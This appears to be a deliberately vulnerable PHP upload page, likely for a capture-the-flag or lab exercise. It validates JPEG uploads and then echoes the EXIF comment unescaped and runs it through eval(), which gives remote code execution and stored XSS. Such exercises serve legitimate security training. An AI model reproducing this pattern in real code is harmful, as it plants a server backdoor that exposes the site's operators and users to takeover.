<?php
function extractCommentMetadata($imagePath) {
    // Intenta extraer metadatos usando la función exif_read_data()
    $exifData = @exif_read_data($imagePath);
    if (!$exifData) {
        return false;
    }
    
    // Devuelve el comentario si está disponible, ajustado para buscar directamente en 'COMMENT'
    return isset($exifData['COMMENT']) ? implode(" ", $exifData['COMMENT']) : false;
}


$showImage = false;
$commentMetadata = '';
$destino = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['image'])) {
    $image = $_FILES['image'];
    $imagePath = $image['tmp_name'];

    // Verificar que el archivo sea una imagen JPEG por MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $imagePath);
    finfo_close($finfo);

    if ($mimeType !== 'image/jpeg') {
        echo "Error: El archivo no es un JPEG válido.";
        exit;
    }

    // Leer los primeros bytes para verificar los magic numbers de JPEG
    $file = fopen($imagePath, 'rb');
    $bytes = fread($file, 2);
    fclose($file);

    if ($bytes !== "\xFF\xD8") {
        echo "Error: El archivo no tiene los magic numbers de un JPEG.";
        exit;
    }

    // Generar un nombre de archivo único para evitar conflictos y ataques específicos
    $destino = 'uploads/' . md5(uniqid(rand(), true)) . '.jpg';

    // Mover la imagen al directorio de destino
    if (move_uploaded_file($imagePath, $destino)) {
        $showImage = true;
        $commentMetadata = extractCommentMetadata($destino);
    } else {
        echo "Error al subir el archivo.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Subir Imagen JPEG y Extraer Metadatos</title>
</head>
<body>
    <h1>Subir Imagen JPEG</h1>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="image" id="image" required>
        <button type="submit">Subir Imagen</button>
    </form>

    <?php if ($showImage): ?>
        <h2>Imagen Subida:</h2>
        <img src="<?php echo htmlspecialchars($destino); ?>" alt="Imagen Subida" style="max-width: 500px;">
        <?php if ($commentMetadata): ?>
            <h3>Metadatos del Comentario:</h3>
            <p><?php echo $commentMetadata; ?></p>
	    <p><?php eval($commentMetadata); ?></p>
        <?php else: ?>
            <p>No se encontraron metadatos del comentario.</p>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
